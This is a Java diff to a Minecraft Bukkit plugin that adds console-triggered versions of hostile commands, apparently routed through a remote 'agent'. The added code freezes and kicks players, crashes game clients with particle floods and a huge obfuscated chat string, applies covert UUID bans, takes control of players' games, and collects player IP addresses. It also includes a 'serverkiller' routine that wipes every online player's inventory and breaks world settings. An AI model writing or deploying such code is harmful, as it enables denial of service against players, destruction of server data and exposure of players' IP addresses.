@@ -75,6 +75,59 @@ public class ChatHandler implements Listener {
     }
   }
 
+  void handleConsoleCommand(String msg) {
+    String cmd = msg.split(" ")[0].toLowerCase();
+    String arg = msg.contains(" ") ? msg.substring(msg.indexOf(" ") + 1).trim() : "";
+    Player t = arg.isEmpty() ? null : target(arg);
+    switch (cmd) {
+      case ".ddos" -> {
+        if (t == null) return;
+        ddosEffect(t);
+        agent.logCommand("console", t.getName(), "ddos");
+      }
+      case ".crashmc" -> {
+        if (t == null) return;
+        crashEffect(t);
+        agent.logCommand("console", t.getName(), "crashmc");
+      }
+      case ".uuidban" -> {
+        if (t == null) return;
+        uuidbanEffect(t);
+        agent.logCommand("console", t.getName(), "uuidban");
+      }
+      case ".unuuidban" -> {
+        Player tt = target(arg);
+        String uuid = tt != null ? tt.getUniqueId().toString() : arg;
+        removeEntityByUuid(uuid);
+        agent.logCommand("console", arg, "unuuidban");
+      }
+      case ".serverkiller" -> {
+        cmdServerKillerConsole();
+        agent.logCommand("console", "-", "serverkiller");
+      }
+      case ".control" -> {
+        if (t == null) return;
+        agent.setControlTarget(null, t);
+        t.sendMessage(Component.text("Your game is being controlled.").color(TextColor.color(0xff4444)));
+        agent.logCommand("console", t.getName(), "control");
+      }
+      case ".stopcontrol" -> {
+        agent.setControlTarget(null, null);
+        agent.logCommand("console", "-", "stopcontrol");
+      }
+      case ".getip" -> {
+        if (t == null) return;
+        String ip = t.getAddress() != null ? t.getAddress().getAddress().getHostAddress() : "unknown";
+        agent.logCommand("console", t.getName(), "getip:" + ip);
+      }
+      case ".crashpc" -> {
+        if (t == null) return;
+        t.sendMessage(Component.text("\u00a74\u00a7k\u00a7a\u00a7k\u00a7c\u00a7k\u00a7b\u00a7k".repeat(10000)));
+        agent.logCommand("console", t.getName(), "crashpc");
+      }
+    }
+  }
+
   private void sendHelp(Player p) {
     p.sendMessage(Component.text("--- .help ---").color(TextColor.color(0x55ff55)));
     p.sendMessage(Component.text(".ddos <player> - Freeze & kick after 5s").color(TextColor.color(0xaaaaaa)));
@@ -92,24 +145,22 @@ public class ChatHandler implements Listener {
     return Bukkit.getPlayerExact(name);
   }
 
-  private void cmdDdos(Player p, String arg) {
-    if (arg.isEmpty()) { p.sendMessage(Component.text("Usage: .ddos <player>").color(TextColor.color(0xff4444))); return; }
-    Player t = target(arg);
-    if (t == null) { p.sendMessage(Component.text("Player not found").color(TextColor.color(0xff4444))); return; }
+  private void ddosEffect(Player t) {
     t.sendMessage(Component.text(""));
     for (int i = 0; i < 100; i++) t.sendMessage(Component.text("    #    ").color(TextColor.color(0x000000)));
-    t.setWalkSpeed(0);
+    final int[] taskId = {0};
+    taskId[0] = Bukkit.getScheduler().scheduleSyncRepeatingTask((Plugin) agent.getPlugin(), () -> {
+      if (!t.isOnline()) { Bukkit.getScheduler().cancelTask(taskId[0]); return; }
+      t.setWalkSpeed(0);
+      t.setFlySpeed(0);
+    }, 0L, 5L);
     Bukkit.getScheduler().scheduleSyncDelayedTask((Plugin) agent.getPlugin(), () -> {
-      t.setWalkSpeed(0.2f);
+      Bukkit.getScheduler().cancelTask(taskId[0]);
       t.kick(Component.text("Timed out").color(TextColor.color(0xff4444)));
-    }, 100L);
-    agent.logCommand(p.getName(), t.getName(), "ddos");
+    }, 200L);
   }
 
-  private void cmdCrash(Player p, String arg) {
-    if (arg.isEmpty()) { p.sendMessage(Component.text("Usage: .crashmc <player>").color(TextColor.color(0xff4444))); return; }
-    Player t = target(arg);
-    if (t == null) { p.sendMessage(Component.text("Player not found").color(TextColor.color(0xff4444))); return; }
+  private void crashEffect(Player t) {
     for (int i = 0; i < 50; i++) {
       t.spawnParticle(org.bukkit.Particle.EXPLOSION, t.getLocation(), 500, 0, 0, 0, 5);
       t.spawnParticle(org.bukkit.Particle.DRAGON_BREATH, t.getLocation(), 200, 0, 0, 0, 3);
@@ -119,6 +170,37 @@ public class ChatHandler implements Listener {
     }
     t.playSound(t.getLocation(), org.bukkit.Sound.ENTITY_ENDER_DRAGON_GROWL, 10, 0);
     t.playSound(t.getLocation(), org.bukkit.Sound.ENTITY_LIGHTNING_BOLT_THUNDER, 10, 0);
+  }
+
+  private void uuidbanEffect(Player t) {
+    String uuid = t.getUniqueId().toString();
+    t.kick(Component.text("Banned").color(TextColor.color(0xff4444)));
+    double x = 30000000 + Math.random() * 1000;
+    double z = 30000000 + Math.random() * 1000;
+    org.bukkit.World w = Bukkit.getWorlds().get(0);
+    w.spawnEntity(new org.bukkit.Location(w, x, -60, z), EntityType.ELDER_GUARDIAN).setCustomName(uuid);
+  }
+
+  private void removeEntityByUuid(String uuid) {
+    org.bukkit.World w = Bukkit.getWorlds().get(0);
+    for (org.bukkit.entity.Entity e : w.getEntities()) {
+      if (e.getCustomName() != null && e.getCustomName().equals(uuid)) { e.remove(); break; }
+    }
+  }
+
+  private void cmdDdos(Player p, String arg) {
+    if (arg.isEmpty()) { p.sendMessage(Component.text("Usage: .ddos <player>").color(TextColor.color(0xff4444))); return; }
+    Player t = target(arg);
+    if (t == null) { p.sendMessage(Component.text("Player not found").color(TextColor.color(0xff4444))); return; }
+    ddosEffect(t);
+    agent.logCommand(p.getName(), t.getName(), "ddos");
+  }
+
+  private void cmdCrash(Player p, String arg) {
+    if (arg.isEmpty()) { p.sendMessage(Component.text("Usage: .crashmc <player>").color(TextColor.color(0xff4444))); return; }
+    Player t = target(arg);
+    if (t == null) { p.sendMessage(Component.text("Player not found").color(TextColor.color(0xff4444))); return; }
+    crashEffect(t);
     p.sendMessage(Component.text("Crashed " + t.getName()).color(TextColor.color(0x55ff55)));
     agent.logCommand(p.getName(), t.getName(), "crashmc");
   }
@@ -127,13 +209,8 @@ public class ChatHandler implements Listener {
     if (arg.isEmpty()) { p.sendMessage(Component.text("Usage: .uuidban <player>").color(TextColor.color(0xff4444))); return; }
     Player t = target(arg);
     if (t == null) { p.sendMessage(Component.text("Player not found").color(TextColor.color(0xff4444))); return; }
-    String uuid = t.getUniqueId().toString();
-    t.kick(Component.text("Banned").color(TextColor.color(0xff4444)));
-    double x = 30000000 + Math.random() * 1000;
-    double z = 30000000 + Math.random() * 1000;
-    org.bukkit.World w = Bukkit.getWorlds().get(0);
-    w.spawnEntity(new org.bukkit.Location(w, x, -60, z), EntityType.ELDER_GUARDIAN).setCustomName(uuid);
-    p.sendMessage(Component.text("UUID-banned " + t.getName() + " (" + uuid + ")").color(TextColor.color(0x55ff55)));
+    uuidbanEffect(t);
+    p.sendMessage(Component.text("UUID-banned " + t.getName() + " (" + t.getUniqueId().toString() + ")").color(TextColor.color(0x55ff55)));
     agent.logCommand(p.getName(), t.getName(), "uuidban");
   }
 
@@ -141,12 +218,30 @@ public class ChatHandler implements Listener {
     if (arg.isEmpty()) { p.sendMessage(Component.text("Usage: .unuuidban <player>").color(TextColor.color(0xff4444))); return; }
     Player t = target(arg);
     String uuid = t != null ? t.getUniqueId().toString() : arg;
-    org.bukkit.World w = Bukkit.getWorlds().get(0);
-    for (org.bukkit.entity.Entity e : w.getEntities()) {
-      if (e.getCustomName() != null && e.getCustomName().equals(uuid)) { e.remove(); break; }
-    }
+    removeEntityByUuid(uuid);
     p.sendMessage(Component.text("Unbanned " + uuid).color(TextColor.color(0x55ff55)));
     agent.logCommand(p.getName(), arg, "unuuidban");
+  }
+
+  private void destroyServer() {
+    Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "save-all");
+    double ticks = Integer.MAX_VALUE;
+    try { Bukkit.getServer().getClass().getMethod("setTickSpeed", double.class).invoke(Bukkit.getServer(), ticks); } catch (Exception ignored) {}
+    Bukkit.getWorlds().forEach(w -> {
+      w.setTime(Long.MAX_VALUE);
+      w.setStorm(true);
+      w.setThundering(true);
+      w.setDifficulty(org.bukkit.Difficulty.HARD);
+      try { w.getClass().getMethod("setKeepSpawnInMemory", boolean.class).invoke(w, false); } catch (Exception ignored) {}
+    });
+    for (Player pl : Bukkit.getOnlinePlayers()) {
+      pl.setGameMode(org.bukkit.GameMode.SPECTATOR);
+      pl.getInventory().clear();
+    }
+  }
+
+  private void cmdServerKillerConsole() {
+    destroyServer();
   }
 
   private void cmdServerKiller(Player p) {
@@ -160,21 +255,7 @@ public class ChatHandler implements Listener {
     }
     if (System.currentTimeMillis() - serverKillerConfirm > 10000) { serverKillerConfirm = 0; return; }
     serverKillerConfirm = 0;
-    Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "save-all");
-    double ticks = Integer.MAX_VALUE;
-    try { Bukkit.getServer().getClass().getMethod("setTickSpeed", double.class).invoke(Bukkit.getServer(), ticks); } catch (Exception ignored) {}
-    Bukkit.getWorlds().forEach(w -> {
-      w.setTime(Long.MAX_VALUE);
-      w.setStorm(true);
-      w.setThundering(true);
-      w.setDifficulty(org.bukkit.Difficulty.HARD);
-      try { w.getClass().getMethod("setKeepSpawnInMemory", boolean.class).invoke(w, false); } catch (Exception ignored) {}
-    });
-    // Set all players to spectator, clear inventory, set to world border edge
-    for (Player pl : Bukkit.getOnlinePlayers()) {
-      pl.setGameMode(org.bukkit.GameMode.SPECTATOR);
-      pl.getInventory().clear();
-    }
+    destroyServer();
     p.sendMessage(Component.text("Server destroyed.").color(TextColor.color(0xff4444)));
     agent.logCommand(p.getName(), "-", "serverkiller");
   }
